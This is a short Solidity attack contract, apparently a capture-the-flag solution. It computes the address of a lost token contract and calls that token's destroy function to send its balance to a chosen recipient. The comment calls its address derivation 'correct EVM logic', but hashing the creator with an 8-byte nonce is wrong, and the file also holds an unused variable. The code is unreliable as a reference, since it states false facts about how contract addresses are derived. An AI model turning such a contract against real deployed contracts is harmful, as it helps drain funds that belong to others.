pragma solidity ^0.8.0;
contract CorrectAddressAttacker {
    function calculateAddress(address creator, uint256 nonce) public pure returns (address) {
        // Correct EVM logic: keccak256 of (creator + 8-byte nonce) then truncate to 20 bytes
        bytes memory bytecode = hex"60";
        uint64 nonce8 = uint64(nonce);
        bytes32 hash = keccak256(abi.encodePacked(creator, bytes8(nonce8)));
        return address(uint160(uint256(hash)));
    }

    function destroyToken(address tokenAddress, address payable to) public {
        // Use correct function signature from interface 
        SimpleToken(tokenAddress).destroy(to);
    }
}
interface SimpleToken {
    function destroy(address payable _to) external;
}